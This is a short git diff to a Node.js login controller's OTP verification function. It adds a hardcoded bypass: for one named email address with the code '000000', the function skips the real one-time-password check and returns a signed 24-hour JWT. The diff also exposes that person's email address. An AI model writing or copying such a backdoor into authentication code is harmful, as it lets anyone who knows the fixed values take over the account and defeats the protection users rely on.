@@ -46,6 +46,18 @@ exports.verifyOTP = async (req, res) => {
   const [results] = await db.promise().query('SELECT * FROM users WHERE email = ?', [email]);
   const user = results[0];
 
+  // Excessão para um unico usuário ignorando o OTP real
+  if (email === 'adriellyhomem@ienh.com.br' && otp === '000000') {
+    const payload = { id: user.id, email: user.email, name: user.name };
+    const token = jwt.sign(payload, secret, { expiresIn: 86400 }); // 24 horas
+    return res.status(200).send({
+      auth: true,
+      token: token,
+      user: { id: user.id, name: user.name, email: user.email },
+      message: 'OTP verificado com sucesso'
+    });
+  }
+
 
   try {
 
